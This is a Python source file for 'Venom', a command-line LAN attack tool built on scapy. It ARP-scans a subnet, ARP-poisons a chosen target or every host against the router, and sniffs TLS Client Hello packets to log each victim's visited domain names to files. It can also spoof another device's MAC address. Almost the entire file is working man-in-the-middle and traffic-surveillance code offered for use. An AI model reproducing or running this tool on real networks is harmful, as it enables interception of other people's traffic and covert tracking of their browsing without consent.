from scapy.all import *
import scapy.all as scapy
from scapy.all import ARP, Ether, srp
from scapy.all import IP, DNSRR, DNSQR, UDP, DNS
import cryptography
from datetime import datetime
from multiprocessing import Process
import argparse
import os
import socket

# Load every useful layers
load_layer("tls")
load_layer("http")
load_layer("dns")

# Initializing Args
parser = argparse.ArgumentParser(description='Venom is a multi tool for LAN Network attacks (MiTM / MAC-Spoofing / Sniffing...).')
g = parser.add_mutually_exclusive_group()
parser.add_argument("-n", "--nuke", help="Using Nuke poisoning mode", action="store_true")
parser.add_argument("-s", "--sniper", help="Using Sniper poisoning mode", action="store_true")
parser.add_argument("-ss", "--scan_speed", help="Choosing ARP Scan speed (1-5)", default=4, type=int)
parser.add_argument("-ml", "--mac_lookup", help="Mac Address Lookup when ARP scanning", action="store_true")
parser.add_argument("-ir", "--ip_range", help="Targeted IP range", default="192.168.1.1/24", type=str)
g.add_argument("-sni", "--sni", help="SNI Sniffing attack", action="store_true")
g.add_argument("-mac", "--mac_spoofer", help="MAC Address Spoofing", action="store_true")
g.add_argument("-sc", "--scan", help="Simple ARP Scanning for host discovery", action="store_true")
parser.add_argument("-iface", "--iface", help="Specify the Iface you want to change the MAC Address of", default="eth0", type=str)

args = parser.parse_args()

my_Mac = Ether().src
my_IP = get_if_addr(conf.iface)
arp_scan_mode = args.scan_speed
mac_look_up = args.mac_lookup
iface = args.iface

def ARP_Scan():
    target_ip = args.ip_range
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    print("\n[+] Starting ARP Scan... (Speed mode: " + str(arp_scan_mode)+ ")")

    if arp_scan_mode == 1:
        result = srp(packet, timeout=10, retry=-3, verbose=0)[0]
    elif arp_scan_mode == 2:
        result = srp(packet, timeout=8, retry=-3, verbose=0)[0]
    elif arp_scan_mode == 3:
        result = srp(packet, timeout=6, retry=-2, verbose=0)[0]
    elif arp_scan_mode == 4:
        result = srp(packet, timeout=4, retry=-2, verbose=0)[0]
    elif arp_scan_mode == 5:
        result = srp(packet, timeout=2, retry=-2, verbose=0)[0]

    targets = []
    for sent, received in result:
        targets.append({'ip': received.psrc, 'mac': received.hwsrc})
    return targets

def targets_table(targets):
    p_targets = []
    i = 0
    for target in targets:
        if target["ip"] != my_IP and target["ip"] != router_ip:
            target_ip = target["ip"]
            target_mac = target["mac"]
            hostname = socket.gethostbyaddr(target_ip)[0]
            hostname = hostname.split(".")
            i = i + 1
            p_targets.append({'ip': target_ip, 'mac': target_mac})
            
            if mac_look_up:
                mac_info = mac_lookup(target_mac)
                print("| Target #"+ str(i) +" | IP: " + str(target_ip) + " | MAC: " + str(target_mac) + " | HOST: {:<15} | INFO: {:<12} |".format(hostname[0], mac_info))
                print("======================================================================================================")
            else:
                print("| Target #"+ str(i) +" | IP: " + str(target_ip) + " | MAC: " + str(target_mac) + " | HOST: {:<15} |".format(hostname[0]))
                print("=================================================================================")
    return p_targets

def change_mac_address(spoofed_mac_address):
    # disable the network interface
    subprocess.check_output(f"ifconfig {iface} down", shell=True)
    # change the MAC
    subprocess.check_output(f"ifconfig {iface} hw ether {spoofed_mac_address}", shell=True)
    # enable the network interface again
    subprocess.check_output(f"ifconfig {iface} up", shell=True)

def spoof(target_ip, target_mac, router_ip, router_mac):
    # Spoofing Router
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = router_ip)
    scapy.send(packet, verbose = False)
    # Spoofing Target
    packet = scapy.ARP(op = 2, pdst = router_ip, hwdst = router_mac, psrc = target_ip)
    scapy.send(packet, verbose = False)

def restore(target_ip, target_mac, router_ip, router_mac):
    # Restauring Targets Tables
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = router_ip, hwsrc = router_mac)
    scapy.send(packet, verbose = False)
    # Restauring Router Table
    packet = scapy.ARP(op = 2, pdst = router_ip, hwdst = router_mac, psrc = target_ip, hwsrc = target_mac)
    scapy.send(packet, verbose = False)

def mac_lookup(mac_address):
    with open("mac_list.txt", 'r', encoding="utf8") as f:
        for line in f:
            if mac_address[:8].upper() in line:
                s_line = line
                mac_info = s_line.split()[1]
                return mac_info
        return "None"

# Processing Packets
def process_packet(packet):
    if "TLS Handshake - Client Hello" in str(packet):
        dt = datetime.now()
        pkt_infos = packet.show(dump=True)
        for line in pkt_infos.splitlines():
            if "servernames=" in line:
                domain = str(line.strip("[]''=")[35:len(line)])
                if domain:
                    ip_routing = str(packet).split("/")
                    if ip_routing[3][5:] != "":
                        with open(str(ip_routing[3][5:17]) + ".txt", "a") as f:
                            print(str(dt) + " | " + ip_routing[3][5:] + "| " + domain, file=f)
                else:
                    pass

def sniping_sniffing(p_targets, target_num):
    i = 0
    for target in p_targets:
            i = i + 1
            if int(target_num) == i:
                target_ip = target["ip"]
    dt = datetime.now()
    print("[SNIFF] - [" + str(dt) + "] - [" + str(target_ip) + "] | Starting Packet Capture !")
    sniff(filter="host "+ target_ip + " and tcp port 443", prn=process_packet)

def nuke_sniffing(targets):
    try:
        for target in targets:
            try:
                target_ip = target["ip"]
                process = Process(target=multi_sniff,  args=(target_ip,))
                process.start()
            except:
                process.terminate()
                break
    except:
        print("pass")
        pass
    
def multi_sniff(target_ip):
    dt = datetime.now()
    print("[SNIFF] - [" + str(dt) + "] - [" + str(target_ip) + "] | Starting Packet Capture !")
    sniff(filter="host "+ target_ip + " and tcp port 443", prn=process_packet)

def sniping_loop(p_targets, target_num, router_ip, router_mac):
    while True:
        try:
            i = 0
            for target in p_targets:
                i = i + 1
                if int(target_num) == i:
                    target_ip = target["ip"]
                    target_mac = target["mac"]
                    try:
                        spoof(target_ip, target_mac, router_ip, router_mac)
                        dt = datetime.now()
                        print("[POISON] - [" + str(dt) + "] - [" + str(target_ip) + "] | Target #" + str(i) + " Poisoned Successfully !")
                        time.sleep(2)
                    except KeyboardInterrupt:
                        break
        except:
            break
            
def nuke_loop(p_targets, router_ip, router_mac):
            while True:
                i = 0
                time.sleep(2)
                print()
                for target in p_targets:
                    try:
                        spoof(target["ip"], target["mac"], router_ip, router_mac)
                        i = i + 1
                        dt = datetime.now()
                        print("[POISON] - [" + str(dt) + "] - [" + str(target["ip"]) + "] | Target #" + str(i) + " Poisoned Successfully !")
                    except KeyboardInterrupt:
                        break
                    except:
                        print("\n[POISON] - Can't reach " + str(target["ip"]) + "... Skipping to the next Target !")
                        pass


#########################################################################################

if __name__ == '__main__':

    # Checking if Attack mode is selected correclty
    if not (args.scan or args.sni or args.mac_spoofer):
        parser.error('No attack selected, choose between: --scan / --sni / --mac_spoofer')
    if (args.sni and args.nuke and args.sniper):
        parser.error('Both attack mode selected, choose --nuke or --sniper')
    if (args.sni and not args.nuke and not args.sniper):
        parser.error('No attack mode selected, choose --nuke or --sniper')
    #if (args.scan and args.sni and args.mac_spoofer):
    #    parser.error('Please only pick one attack, choose between: --scan / --sni / --mac_spoofer')

    # Clear Terminal
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""                                                                                                                                          
                 ..                                ..     
               ':;.                                .;;'   
              ,;.                                    .:,  
             .c.                                      .c. 
             cl                                       .oc 
            .xk.          01010110 01000101           .Ox.
            'OX:      01001110 01010101 01001101      cXO'
            ;KNO,                                    ,OW0,
            ;KNNk.                                  'ONNK;
            ;XWNNd.                                .dXXNK;
            ;XWNWNd.                              .dXNNWX;
            ,0NWNNXd,.                          .,dXWWNN0,
            .xNNNNNX0c.                         c0XNXXNNk.
             :KNNNNXKd.                        .d0KXNNNKc 
             .oKXXXXK0x:,'.                 ';:xKKXNXXKo. 
              .l0XNNNKK0Okl.              .lkO0KKXNNN0l.  
                'lOKXKXXK0Oo;.          .;oO00KXXXX0o'    
                  'd0KKKK0OOxo;.      .,okOO0KXKK0d,      
                   .,ccldxxxo:'        .:oxxxxolc,.       
                         ...              ...
                                                                       
                                            •°¯`•• v.1.0.1 by.Haash ••`¯°•  """)

    # Wait for User to press "Enter" to launch ARP Scan
    input("\n[+] Press Enter to Start... ")

    # ARP scanning the network
    targets = ARP_Scan()

    # checking for Router IP/MAC
    for target in targets:
        if target["ip"] == "192.168.1.1" or target["ip"] == "10.0.0.1"  or target["ip"] == "192.168.1.254":
            router_mac = target["mac"]
            router_ip = target["ip"]

    # Checking all available targets
    print("\n[+] " + str(len(targets) - 1) + " Targets Found: ")
    if args.mac_lookup:
        print("======================================================================================================")
    else:
        print("\n=================================================================================")

    # Showing targets table
    p_targets = targets_table(targets)

    # Possibility for the user to Scan again for better results.
    while True:
        relaunch = input("\n[+] Do you want to relaunch an ARP Scan ? (Y/N): ")
        while relaunch.lower() not in {'y', 'n', 'yes', 'no'}:
            relaunch = input("\n[-] Please input a valid answer ! (Y/N): ")
        if relaunch.lower() == "yes" or relaunch.lower() == "y":
            targets = ARP_Scan()
            print("\n[+] " + str(len(targets) - 2) + " Targets Found: ")
            if mac_look_up:
                print("==============================================================================")
            else:
                print("\n=========================================================")
            p_targets = targets_table(targets)
        elif relaunch.lower() == "no" or relaunch.lower() == "n":
            break

    # If User choosed ARP-Scanning / Show targets table then exit
    if args.scan:
        sys.exit()

    # If User choosed Mac Spoofer / 
    elif args.mac_spoofer:
        target_num = input("\n[+] Which device MAC address would you like to Spoof ? (1/2/3/4/...): ")
        while target_num == "0" or int(target_num) > len(p_targets):
            target_num = input("\n[+] Please select a valid target ! (1/2/3/4/...): ")
        i = 0
        for target in p_targets:
            i = i + 1
            if i == int(target_num):
                target_ip = target["ip"]
                target_mac = target["mac"]
                input("\n[+] Spoofing ready on Target n°" + str(target_num) + " ! | [" + str(my_Mac) + " => " +  str(target_mac) + "] ! Press Enter to Spoof...")
                print("\n============================================================================\n")
                break
        try:
            change_mac_address(target_mac)
            dt = datetime.now()
            spoofed_mac = Ether().src
        except:
            spoofed_mac = Ether().src
            print("[ERROR] - [" + str(dt) + "] - [" + str(spoofed_mac) + "] MAC Address Spoofing Failed !")
            sys.exit()

        if my_Mac == spoofed_mac:
            print("[SPOOF] - [" + str(dt) + "] - [" + str(spoofed_mac) + "] | MAC Address Spoofing Failed !")
            sys.exit() 
        else:
            print("[SPOOF] - [" + str(dt) + "] - [" + str(spoofed_mac) + "] | Target #" + str(i) + " MAC Address Spoofed Succesfully !")
            # Show User Old / New MAC Addresses
            print("[SPOOF] - [" + str(dt) + "] - [" + str(target_mac) + "] | Old MAC Address: " + my_Mac)
            print("[SPOOF] - [" + str(dt) + "] - [" + str(target_mac) + "] | New MAC Address: " + spoofed_mac)
            # Wait for user to press a Key to Restore MAC Address
            print("\n============================================================================")
            input("\n[+] - [" + str(spoofed_mac) + " => " +  str(my_Mac) +"] | Press Enter to restore MAC... ")
            try:
                change_mac_address(my_Mac)
                dt = datetime.now()
                restored_mac = Ether().src
            except:
                restored_mac = Ether().src
                print("\n[ERROR] - [" + str(dt) + "] - [" + str(restored_mac) + "] | Restoring Failed !")
                sys.exit()
            if restored_mac == my_Mac:
                print("\n============================================================================\n")
                print("[RESTORE] - [" + str(dt) + "] - [" + str(spoofed_mac) + "] | MAC Address Restored Succesfully !")
                print("[RESTORE] - [" + str(dt) + "] - [" + str(target_mac) + "] | Old MAC Address: " + spoofed_mac)
                print("[RESTORE] - [" + str(dt) + "] - [" + str(target_mac) + "] | New MAC Address: " + restored_mac)
                print("\n============================================================================\n")
                sys.exit()
            else:
                print("\n[ERROR] - [" + str(dt) + "] - [" + str(target_mac) + "] | Target #" + str(i) + " Restoring Failed !")
                sys.exit()
            

    elif args.sni:
        # If Sniper Mode selected, let user choose the target
        if args.sniper:
            target_num = input("\n[+] Which device would you like to target ? (1/2/3/4/...): ")
            while target_num == "0" or int(target_num) > len(p_targets):
                target_num = input("\n[+] Please select a valid target ! (1/2/3/4/...): ")
            i = 0
            for target in p_targets:
                i = i + 1
                if i == int(target_num):
                    target_ip = target["ip"]
                    target_mac = target["mac"]
                    input("\n[+] Sniping ready on Target n°" + str(target_num) + " [" + str(target_ip) +"] ! Press Enter to launch the attack...")
                    print("\n============================================================================\n")
                    break
        # Set Nuke Mode*
        elif args.nuke:
            input("\n[+] Nuke mode ready ! Press Enter to launch the attack... ")
            print("\n============================================================================\n")

        # Launching Nuke attack
        try:
            if args.nuke:
                try:
                    arp_spoof = Process(target=nuke_loop, args=(p_targets, router_ip, router_mac))
                    sni_sniffing = Process(target=nuke_sniffing, args=(p_targets,))
                    arp_spoof.start()
                    if args.sni:
                        time.sleep(3)
                        sni_sniffing.start()
                        arp_spoof.join()
                        sni_sniffing.join()
                    else:
                        arp_spoof.join()
                except:
                    arp_spoof.terminate()
                    if args.sni:
                        sni_sniffing.terminate()
                    pass

        # Launching Sniping attack
            elif args.sniper:
                try:
                    arp_spoof = Process(target=sniping_loop, args=(p_targets, target_num, router_ip, router_mac))
                    sni_sniffing = Process(target=sniping_sniffing, args=(p_targets, target_num))
                    arp_spoof.start()
                    if args.sni:
                        time.sleep(3)
                        sni_sniffing.start()
                        arp_spoof.join()
                        sni_sniffing.join()
                    else:
                        arp_spoof.join()
                except:
                    arp_spoof.terminate()
                    if args.sni:
                        sni_sniffing.terminate()
                    pass
        except:
            pass

    print("\n===============================")
    print("=== [-] Spoofing Canceled ! ===")
    print("===============================")
    try:
        if args.sniper:
            i = 0
            for target in p_targets:
                i = i + 1
                if int(target_num) == i:
                    target_ip = target["ip"]
                    target_mac = target["mac"]
                    try:
                        restore(target_ip, target_mac, router_ip, router_mac)
                        dt = datetime.now()
                        print("\n[RESTORE] - [" + str(dt) + "] - [" + str(target_ip) + "] | Target #" + str(i) + " Table Restored Successfully !")
                        print("\n[RESTORE] - [" + str(dt) + "] | Exiting... \n")
                        SystemExit()
                    except:
                        print("\n[-] " + str(dt) + " | Can't restore: " + target_ip + " | Exiting... ")
                        SystemExit()

        elif args.nuke:
            # 
            for target in p_targets:
                try:
                    restore(target["ip"], target["mac"], router_ip, router_mac)
                    dt = datetime.now()
                    print("\n[RESTORE] - [" + str(dt) + "] - [" + target["ip"] + "] | ARP table restored !")
                except:
                    dt = datetime.now()
                    print("\n[RESTORE] - [" + str(dt) + "] | Can't restore: " + target["ip"] + " | Skipping to the next Device... ")
                    pass
            dt = datetime.now()
            print("\n[INFO] - [" + str(dt) + "] | Exiting... ")
    except:
        print("\n[-] Restoring Tables Failed ! Exiting...")
        SystemExit()

